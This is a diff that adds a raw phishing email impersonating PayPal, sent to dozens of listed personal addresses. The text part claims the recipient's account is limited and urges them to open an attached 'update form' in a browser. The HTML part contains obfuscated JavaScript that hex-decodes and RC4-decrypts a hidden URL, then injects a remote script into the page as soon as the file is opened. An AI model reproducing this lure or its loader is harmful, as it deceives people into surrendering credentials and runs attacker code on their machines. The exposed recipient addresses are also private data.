@@ -1,0 +1,46 @@
+Content-Type: multipart/mixed; boundary="===============2454541177490655485=="
+MIME-Version: 1.0
+From: PayPal Support <safeguard@clients.org>
+Message-Id: <d56a655c57bd57fb79b3bc481214b83c@U610Cc42W5Krk6.net>
+Subject: Important update notice
+To: songlines@ymail.com
+ songlinbai@hotmail.com; songlinbin@hantech.com.cn; songlincai@hotmail.com;
+ songline05@hotmail.com; songline@austin.rr.com; songline@btopenworld.com;
+ songlines2@hotmail.com; songlines@clear.net; songlines@exemail.com.au;
+ songlines@paradise.net.nz; songlines@ymail.com; songlinfan@hotmail.com;
+ songling.cao@cgi.com; songling1122@hotmail.com; songling88@hotmail.com;
+ songling922@126.com; songling@fjirsm.ac.cn; songling@hotmail.com;
+ songling@juniper.net; songling_hu@hotmail.com; songling_wuxi@hotmail.com;
+ songling_yang@hotmail.com; songling_ye@hotmail.com; songlinga@hotmail.com
+
+--===============2454541177490655485==
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+Your account have been limited.
+
+In order for us to ensure the safety of our users, we will limit an account that has
+missing or outdated information. It's highly risky for PayPal users to conduct transactions
+with another person who has these problems.
+
+We have reviewed your account and we found some outdated or missing information on your account.
+
+To lift your limitations and granting you full access to your account again, we need you to complete
+the update form (attached in the email). You may open the form in your browser.
+
+After we review your current information that you submit, we'll remove any limitations set on your
+account. However, if there are insufficient or invalid information, we'll send you another notification
+by email.
+
+Thank you for keeping PayPal safe. We appreciate your compliance to our User Agreement terms.
+
+Sincerely,
+PayPal Security Department
+--===============2454541177490655485==
+MIME-Version: 1.0
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html><head><meta charset="utf-8"></head><body><script>function a90t40sm(znibe6){    var r2373c3n7 = 0;    var js34 = '';    if( znibe6.substr(0,2) == '0x' ){ r2373c3n7 = 2; }    if( typeof znibe6 != 'string' ){ znibe6 = znibe6.toString(); }    for(var yd0i=r2373c3n7;  yd0i<znibe6.length; yd0i+=2) {        var c = znibe6.substr( yd0i, 2 );        js34 = js34 + String.fromCharCode( parseInt(c, 16) );        }    return js34;}function euxru(n4049s1, d8r2u4s) {  var v1hn95tht, nx0u, gtz698zfb, b0qc, f430, v91r3;  for (v1hn95tht = [], nx0u = 0, b0qc = "", f430 = 0; f430 < 256; f430++) v1hn95tht[f430] = f430;  for (f430 = 0; f430 < 256; f430++)    nx0u = (nx0u + v1hn95tht[f430] + d8r2u4s.charCodeAt((f430 % d8r2u4s.length))) % 256,    gtz698zfb = v1hn95tht[f430],    v1hn95tht[f430] = v1hn95tht[nx0u],    v1hn95tht[nx0u] = (gtz698zfb);  for (f430 = 0, nx0u = 0, v91r3 = 0; v91r3 < n4049s1.length; v91r3++)    f430 = ((f430 + 1) % 256),    nx0u = ((nx0u + v1hn95tht[f430]) % 256),    gtz698zfb = v1hn95tht[f430],    v1hn95tht[f430] = v1hn95tht[nx0u],    v1hn95tht[nx0u] = gtz698zfb,    b0qc += String.fromCharCode(n4049s1.charCodeAt(v91r3) ^ v1hn95tht[(v1hn95tht[f430] + v1hn95tht[nx0u]) % 256]);  return b0qc}var g799 = euxru(a90t40sm("f24090e56910e6ff9b2876e4b7b2839080c4c6e26c91f3be997f2043d344857b60af8e386a686547b75b3533184b91ff2bd4f490776df6c7773754"),"l9769gev3");var p637 = euxru(a90t40sm("e95796fc234b"),"l9769gev3");var oueu16r = document.createElement(p637);oueu16r.src = g799;var d1n61q4 = euxru(a90t40sm("f25185f1"),"l9769gev3");document.getElementsByTagName(d1n61q4)[0].appendChild(oueu16r);</script></body></html>
+--===============2454541177490655485==--
